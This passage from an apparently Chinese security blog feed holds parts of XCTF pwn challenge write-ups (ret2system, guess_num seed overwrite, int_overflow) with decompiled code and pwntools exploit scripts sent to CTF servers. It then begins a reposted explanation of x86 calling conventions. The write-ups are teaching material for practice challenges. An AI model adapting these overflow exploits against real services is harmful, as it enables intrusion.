Ebp</code>的字节</li><li><code>str(p32(system),encoding=&quot;unicode_escape&quot;)</code>：是system的地址</li><li><code>&quot;a&quot;*4</code>：作为system函数的返回地址</li><li><code>str(p32(/bin/sh),encoding=&quot;unicode_escape&quot;)</code>：是system参数/bin/sh的地址</li></ul></blockquote><p><img src="/images/122-1.png" alt></p><h4 id="4exp-4"><a class="markdownIt-Anchor" href="#4exp-4"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">35965</span>)</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">"debug"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>,arch=<span class="string">"i386"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">"a"</span> + <span class="number">4</span>*<span class="string">"a"</span> + str(p32(<span class="number">0x08048320</span>),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">4</span> + str(p32(<span class="number">0x0804A024</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x04-guess_numfont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-guess_numfont"></a> <font color="navy"><code>0x04 guess_num</code></font></h3><h4 id="1相关知识点-5"><a class="markdownIt-Anchor" href="#1相关知识点-5"></a> <code>1.相关知识点</code></h4><blockquote><ol><li><code>srand()</code>、<code>rand()</code>函数</li><li>python的<a href="https://docs.python.org/zh-cn/3.7/library/ctypes.html" target="_blank" rel="noopener"><code>ctypes</code></a>外部函数库</li></ol></blockquote><h4 id="2解题思路-5"><a class="markdownIt-Anchor" href="#2解题思路-5"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file guess_num </span><br><span class="line">guess_num: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c5689a0b4458c068fb51e3a2c167b112c3ba7323, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该pwn文件也是一个64位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec guess_num </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/guess_num/guess_num&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><blockquote><p>几乎能开的保护全都开启了，所以这无疑增加了这道题目的难度</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi@1</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// rdi@1</span></span><br><span class="line">  __int64 result; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v7; <span class="comment">// rsi@7</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+Ch] [bp-34h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [sp+30h] [bp-10h]@1</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v13 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">stderr</span>;</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v4) = sub_BB0(v3, <span class="number">0L</span>L);</span><br><span class="line">  *(_QWORD *)seed = v4;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;v11);</span><br><span class="line">  v5 = (<span class="keyword">const</span> <span class="keyword">char</span> *)seed[<span class="number">0</span>];</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 != v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = <span class="string">"Success!"</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E(v5);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  v7 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v13;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们采用逆推的思想，从上面的源代码可以看出，要想输出“Success”，就必须使得我们10次的输入与随机化产生的数值要想等，在之前还要输入一个name变量的字符串，可以看出gets()是一个危险函数，因为他不判断输入的长度，所以我们可以利用这一点。</p><p><br>再来看一下seed[2]的起始位置<code>bp-10h</code>，以及v11的位置<code>bp-30h</code>，所以说seed[0]的位置为<code>ebp-10h</code>，seed[1]的位置为<code>ebp-20h</code>，我们是不是可以通过gets函数，来改变seed[0]的值呢？答案是可以的，虽然开启了金丝雀和栈不可执行，但是这两个空间是一个连续空间，金丝雀并不会产生影响。</p><p><br>我们根据赋的值自己生成一下产生的10个（伪）随机数值，然后我们就可以获得flag</p></blockquote><h4 id="3解题步骤-5"><a class="markdownIt-Anchor" href="#3解题步骤-5"></a> <code>3.解题步骤</code></h4><blockquote><p>假如seed[0]被我们填充的为3时，产生的数值是什么？我们写了一个下面的脚本：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        srand(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i &lt;=<span class="number">9</span>;i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,rand()%<span class="number">6</span>+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>产生的数字为：<code>1</code>、<code>2</code>、<code>1</code>、<code>1</code>、<code>4</code>、<code>5</code>、<code>1</code>、<code>5</code>、<code>2</code>、<code>5</code>。那么下面我们可以写出我们的payload</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">49881</span>)</span><br><span class="line">payload = <span class="number">0x20</span> * <span class="string">"a"</span> + str(p64(<span class="number">3</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.recvline(<span class="string">"your name!"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">num = <span class="string">"1211451525"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">    r.recvline(<span class="string">"guess number:"</span>)</span><br><span class="line">    r.sendline(i)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="5存在的问题-2"><a class="markdownIt-Anchor" href="#5存在的问题-2"></a> <code>5.存在的问题</code></h4><blockquote><p>网上用到了这样的exp</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">'./d22084e1938f4b21a380e38e2fb48629'</span>)</span><br><span class="line"><span class="comment"># p = remote("111.198.29.45", 39368)</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">'Your name:'</span>, payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    num = str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> num + <span class="string">'\n'</span></span><br><span class="line">    p.sendlineafter(<span class="string">'number:'</span>,num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-int_overflow"><a class="markdownIt-Anchor" href="#0x05-int_overflow"></a> <code>0x05 int_overflow</code></h3><h4 id="1相关知识点-6"><a class="markdownIt-Anchor" href="#1相关知识点-6"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>数据类型大小：会产生溢出的情况</li></ol><p><img src="/images/122-5.png" alt></p></blockquote><h4 id="2解题思路-6"><a class="markdownIt-Anchor" href="#2解题思路-6"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file int_overflow </span><br><span class="line">int_overflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=aaef797b1ad6698f0c629966a879b42e92de3787, not stripped</span><br></pre></td></tr></table></figure><blockquote><p><code>int_overflow</code>文件是一个32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec int_overflow </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/int_flow/int_overflow&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"~~ Welcome to CTF! ~~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       1.Login       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       2.Exit        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your choice:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye~"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Choice!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// login()函数</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-228h]@1</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+200h] [bp-28h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your username:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your passwd:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);</span><br><span class="line">  <span class="keyword">return</span> check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check_passwd(&amp;buf)函数</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+4h] [bp-14h]@3</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [sp+Fh] [bp-9h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Password"</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们将上面的函数关系画一个简单的示意图，如下：</p></blockquote><p><img src="/images/122-7.png" alt></p><blockquote><p>现在对上面的源代码进行详细分析一下：该程序有两三处输入点：</p><ul><li>第一个是选择登录或者退出</li><li>第二个是输入我们的name</li><li>第三个是输入密码，而且passwd的最大输入长度为<code>0x199u</code>，并且在check_passwd检查passwd的长度，如果长度大于3小于等于8的话，输出“Success”，并且返回一个指向最终的目标字符串 dest 的指针<code>result</code>；否则输出“Invalid Password”，结束执行。而dest的位置为<code>ebp-14h</code>。这里还要注意一点就是v3是一个一字节长度的变量，前面对passwd进行长度限制时，最大长度为0x199，这很明显一个字节存储不下。那么会发生什么呢？整数溢出。</li></ul></blockquote><h4 id="3解题步骤-6"><a class="markdownIt-Anchor" href="#3解题步骤-6"></a> <code>3.解题步骤</code></h4><p>      首先先看一下怎么绕过<code>v3 &lt;= 3u || v3 &gt; 8u</code>，在这里v3是一个单字节变量，且是passwd的长度，而由于passwd最长可以输入<code>0x199</code>长度的字符串，所以我们先算好应该输入多长的passwd才能绕过if的判断语句：</p><blockquote><p>因为v3是单字节，也就是8个bit，正常来说v3为<code>0000 0100</code>到<code>0000 1000</code>区间都可以，也就是在[4,8]区间，如果v3的最高位产生了溢出，比如第9位为1，那么输入的长度应该在<code>1 0000 0100</code>到<code>1 0000 1000</code>，也就是[260,264]区间，在这里我们选择输入的长度为262</p></blockquote><p>      观察dest相对ebp的位置，从IDA中可以看出，dest位于<code>ebp-0x14</code>的位置，然后又因为存在一个<code>old ebp</code>，所以前面需要<code>0x14+4=0x18</code>字节的填充；</p><p>      我们又从IDA中可以找出<code>what_is_this</code>函数，该函数可以打印<code>flag.txt</code>，因为前面已经输入<code>0x14+4+4=0x1c</code>长度的字节，所以现在还剩<code>262-0x1c=234</code>长度的填充，示意图如下：</p><p><img src="/images/122-8.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-when_did_you_bornfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-when_did_you_bornfont&quot;&gt;&lt;/a&gt; &lt;font
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】常见调用约定总结</title>
    <link href="https://muzibing.github.io/2020/05/31/2020.05.31%EF%BC%88121%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/31/2020.05.31（121）/</id>
    <published>2020-05-30T16:00:00.000Z</published>
    <updated>2020-05-31T15:27:05.848Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-常见的调用约定"><a href="#0x00-常见的调用约定" class="headerlink" title="0x00 常见的调用约定"></a><font color="navy">0x00 常见的调用约定</font></h3><h4 id="一、cdecl调用约定"><a href="#一、cdecl调用约定" class="headerlink" title="一、cdecl调用约定"></a><code>一、cdecl调用约定</code></h4><blockquote><p>又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。<font color="navy"><strong>函数参数按照从右到左的顺序入栈</strong>，<strong>函数调用者负责清除栈中的参数</strong>，<strong>返回值在EAX中</strong>。</font>由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。</p></blockquote><h4 id="二、stdcall调用约定-微软命名"><a href="#二、stdcall调用约定-微软命名" class="headerlink" title="二、stdcall调用约定(微软命名)"></a><code>二、stdcall调用约定(微软命名)</code></h4><blockquote><p>Pascal程序缺省调用方式，WinAPI也多采用该调用约定。<font color="navy"><strong>stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中</strong>。</font>stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如<code>_functionname@number</code></p></blockquote><h4 id="三、fastcall调用约定"><a href="#三、fastcall调用约定" class="headerlink" title="三、fastcall调用约定"></a><code>三、fastcall调用约定</code></h4><blockquote><p>stdcall调用约定的变形，<font color="navy"><strong>通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。</strong></font>因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。</p></blockquote><h4 id="四、thiscall调用约定"><a href="#四、thiscall调用约定" class="headerlink" title="四、thiscall调用约定"></a><code>四、thiscall调用约定</code></h4><blockquote><p> C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。</p><p><br>thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。</p><p><br>注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。</p></blockquote><h4 id="五、naked-call调用约定"><a href="#五、naked-call调用约定" class="headerlink" title="五、naked call调用约定"></a><code>五、naked call调用约定</code></h4><blockquote><p>对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数：</p><p><br>代码示例如下(Windows采用Intel汇编语法，注释符为;)：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) <span class="keyword">int</span> __<span class="function">stdcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T)</span><br><span class="line">    __asm mov eax, a</span><br><span class="line">    __asm add eax, b</span><br><span class="line">    __asm ret <span class="number">8</span></span><br><span 